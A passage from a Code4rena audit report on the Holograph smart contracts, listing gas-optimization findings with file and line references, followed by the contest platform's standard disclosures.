2022-10-holograph/contracts/enforcer/HolographERC721.sol::263 => require(success && selector == InitializableInterface.init.selector, "ERC721: coud not init PA1D");
2022-10-holograph/contracts/enforcer/Holographer.sol::166 => require(success && selector == InitializableInterface.init.selector, "initialization failed");
```

## [G-17] Public functions not called by the contract should be declared external instead

Contracts are allowed to override their parents' functions and change the visibility from external to public and can save gas by doing so.

```
2022-10-holograph/contracts/enforcer/HolographERC20.sol::273 => function decimals() public view returns (uint8) {
2022-10-holograph/contracts/enforcer/HolographERC20.sol::297 => function allowance(address account, address spender) public view returns (uint256) {
2022-10-holograph/contracts/enforcer/HolographERC20.sol::306 => function DOMAIN_SEPARATOR() public view returns (bytes32) {
2022-10-holograph/contracts/enforcer/HolographERC20.sol::310 => function name() public view returns (string memory) {
2022-10-holograph/contracts/enforcer/HolographERC20.sol::314 => function nonces(address account) public view returns (uint256) {
2022-10-holograph/contracts/enforcer/HolographERC20.sol::318 => function symbol() public view returns (string memory) {
2022-10-holograph/contracts/enforcer/HolographERC20.sol::322 => function totalSupply() public view returns (uint256) {
2022-10-holograph/contracts/enforcer/HolographERC20.sol::347 => function burnFrom(address account, uint256 amount) public returns (bool) {
2022-10-holograph/contracts/enforcer/HolographERC20.sol::363 => function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
2022-10-holograph/contracts/enforcer/HolographERC20.sol::420 => function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
2022-10-holograph/contracts/enforcer/HolographERC721.sol::643 => function burned(uint256 tokenId) public view returns (bool) {
2022-10-holograph/contracts/enforcer/PA1D.sol::471 => function configurePayouts(address payable[] memory addresses, uint256[] memory bps) public onlyOwner {
2022-10-holograph/contracts/enforcer/PA1D.sol::488 => function getPayoutInfo() public view returns (address payable[] memory addresses, uint256[] memory bps) {
2022-10-holograph/contracts/enforcer/PA1D.sol::497 => function getEthPayout() public {
2022-10-holograph/contracts/enforcer/PA1D.sol::507 => function getTokenPayout(address tokenAddress) public {
2022-10-holograph/contracts/enforcer/PA1D.sol::517 => function getTokensPayout(address[] memory tokenAddresses) public {
2022-10-holograph/contracts/enforcer/PA1D.sol::549 => function royaltyInfo(uint256 tokenId, uint256 value) public view returns (address, uint256) {
2022-10-holograph/contracts/enforcer/PA1D.sol::558 => function getFeeBps(uint256 tokenId) public view returns (uint256[] memory) {
2022-10-holograph/contracts/enforcer/PA1D.sol::569 => function getFeeRecipients(uint256 tokenId) public view returns (address payable[] memory) {
2022-10-holograph/contracts/enforcer/PA1D.sol::604 => function getFees(uint256 tokenId) public view returns (address payable[] memory, uint256[] memory) {
2022-10-holograph/contracts/enforcer/PA1D.sol::649 => function marketContract() public view returns (address) {
2022-10-holograph/contracts/enforcer/PA1D.sol::655 => function tokenCreators(uint256 tokenId) public view returns (address) {
2022-10-holograph/contracts/enforcer/PA1D.sol::665 => function bidSharesForToken(uint256 tokenId) public view returns (ZoraBidShares memory bidShares) {
```

## [G-18] Not using the named return variables when a function returns, wastes deployment gas

It is not necessary to have both a named return and a return statement.

```
2022-10-holograph/contracts/HolographFactory.sol::181 => ) external pure returns (bytes4 selector, bytes memory data) {
2022-10-holograph/contracts/HolographOperator.sol::717 => function getTotalPods() external view returns (uint256 totalPods) {
2022-10-holograph/contracts/HolographOperator.sol::804 => function getBondedAmount(address operator) external view returns (uint256 amount) {
2022-10-holograph/contracts/HolographOperator.sol::814 => function getBondedPod(address operator) external view returns (uint256 pod) {
2022-10-holograph/contracts/enforcer/HolographERC20.sol::396 => ) external onlyBridge returns (bytes4 selector, bytes memory data) {
2022-10-holograph/contracts/enforcer/HolographERC721.sol::417 => ) external onlyBridge returns (bytes4 selector, bytes memory data) {
2022-10-holograph/contracts/enforcer/HolographERC721.sol::761 => try HolographERC721Interface(_operator).ownerOf(_tokenId) returns (address tokenOwner) {
2022-10-holograph/contracts/enforcer/PA1D.sol::549 => function royaltyInfo(uint256 tokenId, uint256 value) public view returns (address, uint256) {
2022-10-holograph/contracts/enforcer/PA1D.sol::569 => function getFeeRecipients(uint256 tokenId) public view returns (address payable[] memory) {
2022-10-holograph/contracts/enforcer/PA1D.sol::590 => function getRoyalties(uint256 tokenId) public view returns (address payable[] memory, uint256[] memory) {
2022-10-holograph/contracts/enforcer/PA1D.sol::604 => function getFees(uint256 tokenId) public view returns (address payable[] memory, uint256[] memory) {
2022-10-holograph/contracts/enforcer/PA1D.sol::665 => function bidSharesForToken(uint256 tokenId) public view returns (ZoraBidShares memory bidShares) {
2022-10-holograph/contracts/module/LayerZeroModule.sol::256 => ) external view returns (uint256 hlgFee, uint256 msgFee) {
2022-10-holograph/contracts/module/LayerZeroModule.sol::281 => ) external view returns (uint256 hlgFee) {
```

## [G-19] Multiple address mappings can be combined into a single mapping of an address to a struct, where appropriate

Saves a storage slot for the mapping. Depending on the circumstances and sizes of types, can avoid a Gsset (20000 gas) per mapping combined. Reads and subsequent writes can also be cheaper when a function requires both values and they both fit in the same storage slot. Finally, if both fields are accessed in the same function, can save ~42 gas per access due to not having to recalculate the key's keccak256 hash (Gkeccak256 - 30 gas) and that calculation's associated stack operations.

```
2022-10-holograph/contracts/HolographOperator.sol::218 => mapping(address => uint256) private _bondedOperators;
2022-10-holograph/contracts/HolographOperator.sol::223 => mapping(address => uint256) private _operatorPodIndex;
2022-10-holograph/contracts/HolographOperator.sol::228 => mapping(address => uint256) private _bondedAmounts;
2022-10-holograph/contracts/enforcer/HolographERC20.sol::156 => mapping(address => uint256) private _balances;
2022-10-holograph/contracts/enforcer/HolographERC20.sol::161 => mapping(address => mapping(address => uint256)) private _allowances;
2022-10-holograph/contracts/enforcer/HolographERC20.sol::186 => mapping(address => uint256) private _nonces;
2022-10-holograph/contracts/enforcer/HolographERC721.sol::185 => mapping(address => uint256) private _ownedTokensCount;
2022-10-holograph/contracts/enforcer/HolographERC721.sol::190 => mapping(address => uint256[]) private _ownedTokens;
2022-10-holograph/contracts/enforcer/HolographERC721.sol::196 => mapping(address => mapping(address => bool)) private _operatorApprovals;
```

## [G-20] Use assembly to check for address(0)

Saves 6 gas per instance if using assembly to check for address(0)

e.g.
```
assembly {
 if iszero(_addr) {
  mstore(0x00, "zero address")
  revert(0x00, 0x20)
 }
}
```

instances:

```
2022-10-holograph/contracts/HolographOperator.sol::333 => if (job.operator != address(0)) {
2022-10-holograph/contracts/enforcer/HolographERC20.sol::620 => require(account != address(0), "ERC20: account is zero address");
2022-10-holograph/contracts/enforcer/HolographERC20.sol::621 => require(spender != address(0), "ERC20: spender is zero address");
2022-10-holograph/contracts/enforcer/HolographERC20.sol::627 => require(account != address(0), "ERC20: account is zero address");
2022-10-holograph/contracts/enforcer/HolographERC20.sol::684 => require(to != address(0), "ERC20: minting to burn address");
2022-10-holograph/contracts/enforcer/HolographERC20.sol::695 => require(account != address(0), "ERC20: account is zero address");
2022-10-holograph/contracts/enforcer/HolographERC20.sol::696 => require(recipient != address(0), "ERC20: recipient is zero address");
2022-10-holograph/contracts/enforcer/HolographERC721.sol::419 => require(to != address(0), "ERC721: zero address");
2022-10-holograph/contracts/enforcer/HolographERC721.sol::639 => require(wallet != address(0), "ERC721: zero address");
2022-10-holograph/contracts/enforcer/HolographERC721.sol::657 => return _tokenOwner[tokenId] != address(0);
2022-10-holograph/contracts/enforcer/HolographERC721.sol::689 => require(tokenOwner != address(0), "ERC721: token does not exist");
2022-10-holograph/contracts/enforcer/HolographERC721.sol::816 => require(to != address(0), "ERC721: minting to burn address");
2022-10-holograph/contracts/enforcer/HolographERC721.sol::870 => require(to != address(0), "ERC721: use burn instead");
2022-10-holograph/contracts/enforcer/HolographERC721.sol::895 => return tokenOwner != address(0);
```

## [G-21] Use selfbalance()

Use selfbalance() instead of address(this).balance when getting your contract's balance of ETH to save gas.

```
2022-10-holograph/contracts/enforcer/PA1D.sol::389 => uint256 balance = address(this).balance;
```

## [G-22] Using storage instead of memory for structs/arrays saves gas

When fetching data from a storage location, assigning the data to a memory variable causes all fields of the struct/array to be read from storage, which incurs a Gcoldsload (2100 gas) for each field of the struct/array. If the fields are read from the new memory variable, they incur an additional MLOAD rather than a cheap stack read.

Instead of declearing the variable with the memory keyword, declaring the variable with the storage keyword and caching any fields that need to be re-read in stack variables, will be much cheaper, only incuring the Gcoldsload for the fields actually read. The only time it makes sense to read the whole struct/array into a memory variable, is if the full struct/array is being returned by the function, is being passed to a function that requires memory, or if the array/struct is being read from another memory array/struct

```
2022-10-holograph/contracts/enforcer/PA1D.sol::541 => address[] memory receivers = new address[](1);
2022-10-holograph/contracts/enforcer/PA1D.sol::543 => uint256[] memory bps = new uint256[](1);
2022-10-holograph/contracts/enforcer/PA1D.sol::559 => uint256[] memory bps = new uint256[](1);
2022-10-holograph/contracts/enforcer/PA1D.sol::570 => address payable[] memory receivers = new address payable[](1);
2022-10-holograph/contracts/enforcer/PA1D.sol::591 => address payable[] memory receivers = new address payable[](1);
2022-10-holograph/contracts/enforcer/PA1D.sol::592 => uint256[] memory bps = new uint256[](1);
2022-10-holograph/contracts/enforcer/PA1D.sol::605 => address payable[] memory receivers = new address payable[](1);
2022-10-holograph/contracts/enforcer/PA1D.sol::606 => uint256[] memory bps = new uint256[](1);
```

## [G-23] internal functions only called once can be inlined to save gas

Not inlining costs 20 to 40 gas because of two extra JUMP instructions and additional stack operations needed for function calls.

```
2022-10-holograph/contracts/abstract/ERC20H.sol::203 => function _setOwner(address ownerAddress) internal {
2022-10-holograph/contracts/abstract/ERC721H.sol::203 => function _setOwner(address ownerAddress) internal {
2022-10-holograph/contracts/module/LayerZeroModule.sol::225 => * @dev Need to add an extra function to get LZ gas amount needed for their internal cross-chain message verification
```

## [G-25] internal functions not called by the contract should be removed to save deployment gas

If the functions are required by an interface, the contract should inherit from that interface and use the override keyword

```
2022-10-holograph/contracts/abstract/ERC20H.sol::203 => function _setOwner(address ownerAddress) internal {
2022-10-holograph/contracts/abstract/ERC721H.sol::203 => function _setOwner(address ownerAddress) internal {
2022-10-holograph/contracts/module/LayerZeroModule.sol::225 => * @dev Need to add an extra function to get LZ gas amount needed for their internal cross-chain message verification
```

**[alexanderattar (Holograph) confirmed](https://github.com/code-423n4/2022-10-holograph-findings/issues/313#event-7777371550)**



***

# Disclosures

C4 is an open organization governed by participants in the community.

C4 Contests incentivize the discovery of exploits, vulnerabilities, and bugs in smart contracts. Security researchers are rewarded at an increasing rate for finding higher-risk issues. Contest submissions are judged by a knowledgeable security researcher and solidity developer and disclosed to sponsoring developers. C4 does not conduct formal verification regarding the provided code but instead provides final verification.

C4 does not provide any guarantee or warranty regarding the security of this project. All smart contract software should be used at the sole risk and responsibility of users.
